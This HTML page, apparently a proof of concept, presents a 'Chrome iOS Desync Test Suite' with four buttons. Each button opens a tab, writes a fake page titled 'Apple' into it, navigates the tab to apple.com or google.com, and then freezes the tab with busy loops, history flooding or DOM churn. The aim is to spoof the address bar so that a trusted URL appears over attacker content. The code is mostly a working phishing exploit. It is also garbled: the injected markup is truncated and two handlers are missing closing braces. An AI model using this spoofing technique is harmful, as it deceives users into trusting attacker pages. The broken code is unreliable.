<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta
      name="viewport"
      content="width=device-width, initial-scale=1, user-scalable=yes"
    />
    <title>Comprehensive Desync Test Suite - Zero</title>
    <style>
      body, html {
        margin: 0;
        padding: 0;
        height: 100%;
        background: #0f0f11;
        color: #fff;
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      }
      .container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100%;
        gap: 16px;
        padding: 20px;
        box-sizing: border-box;
      }
      h1 {
        font-size: 24px;
        margin-bottom: 10px;
        color: #f5f5f7;
      }
      button {
        width: 100%;
        max-width: 360px;
        padding: 16px 24px;
        font-size: 16px;
        font-weight: 600;
        background: #007aff;
        color: #fff;
        border: none;
        border-radius: 12px;
        cursor: pointer;
        box-shadow: 0 4px 14px rgba(0, 122, 255, 0.3);
        transition: transform 0.1s ease, background 0.2s ease;
      }
      button:active {
        transform: scale(0.97);
      }
      .btn-danger {
        background: #ff3b30;
        box-shadow: 0 4px 14px rgba(255, 59, 48, 0.3);
      }
      .btn-warning {
        background: #ff9500;
        box-shadow: 0 4px 14px rgba(255, 149, 0, 0.3);
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h1>Chrome iOS Desync Test Suite</h1>
      
      <!-- Test 1: Standard Reflow Stalling -->
      <button id="test1">Test 1: Standard Reflow Stalling</button>

      <!-- Test 2: History State Flooding + Reflow -->
      <button id="test2" class="btn-warning">Test 2: History State Flooding</button>

      <!-- Test 3: Aggressive DOM Mutation Storm -->
      <button id="test3" class="btn-danger">Test 3: DOM Mutation Storm</button>

      <!-- Test 4: Rapid Navigation Target Switch -->
      <button id="test4">Test 4: Multi-Target Location Switch</button>
    </div>

    <script>
      // Helper universal untuk membuat template tab penyerang
      function injectAttackerContent(win) {
        if (!win) return;
        win.document.write(`
          <!DOCTYPE html>
          <html>
          <head>
            <title>Apple</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">

              <p style="font-size:18px;color:#86868b;margin:0;">Testing pipeline synchronization state...</p>
            </div>
          </body>
          </html>
        `);
        win.document.close();
        try { win.focus(); } catch (e) {}
      }

      // --- TEST 1 ---
      document.getElementById("test1").onclick = function () {
        const newTab = window.open("", "_blank");
        if (newTab) {
          injectAttackerContent(newTab);
          setTimeout(() => { newTab.location.href = "https://apple.com"; }, 15);
          setTimeout(() => {
            try {
              newTab.eval(`
                const start = Date.now();
                while (Date.now() - start < 2000) {
                  const h = document.body.offsetHeight;
                  document.body.style.background = (h % 2 === 0) ? '#fff' : '#fafafa';
                }
              `);
            } catch (e) {
              let s = Date.now(); while(Date.now() - s < 2000) {}
            }
          }, 90);
        }
      };

      // --- TEST 2 ---
      document.getElementById("test2").onclick = function () {
        const newTab = window.open("", "_blank");
        if (newTab) {
          injectAttackerContent(newTab);
          setTimeout(() => {
            try {
              newTab.history.pushState({test: 1}, "", "#locked-state");
              newTab.location.href = "https://apple.com";
            } catch (err) {}
          }, 15);
          setTimeout(() => {
            try {
              newTab.eval(`
                const start = Date.now();
                while (Date.now() - start < 2200) {
                  history.pushState({test: Math.random()}, "", "#flood");
                  const d = document.body.offsetHeight;
                }
              `);
            } catch (e) {
              let s = Date.now(); while(Date.now() - s < 2200) {}
            }
          }, 80);
        }
      };

      // --- TEST 3 ---
      document.getElementById("test3").onclick = function () {
        const newTab = window.open("", "_blank");
        if (newTab) {
          injectAttackerContent(newTab);
          setTimeout(() => { newTab.location.href = "https://apple.com"; }, 15);
          setTimeout(() => {
            try {
              newTab.eval(`
                const start = Date.now();
                const body = document.body;
                while (Date.now() - start < 2500) {
                  const el = document.createElement('div');
                  el.innerText = Math.random();
                  body.appendChild(el);
                  if(body.childNodes.length > 100) body.innerHTML = "<h1>Locked</h1>";
                }
              `);
            } catch (e) {
              let s = Date.now(); while(Date.now() - s < 2500) {}
            }

        }
      };

      // --- TEST 4 ---
      document.getElementById("test4").onclick = function () {
        const newTab = window.open("", "_blank");
        if (newTab) {
          injectAttackerContent(newTab);
          setTimeout(() => {
            try {
              newTab.location.href = "https://google.com";
              setTimeout(() => {
                newTab.location.href = "https://apple.com";
              }, 10);
            } catch (err) {}

          setTimeout(() => {
            try {
              newTab.eval(`
                const start = Date.now();
                while (Date.now() - start < 2000) {
                  const f = document.body.offsetHeight;
                }
              `);
            } catch (e) {

          }, 60);
        }
      };
    </script>
  </body>
</html>
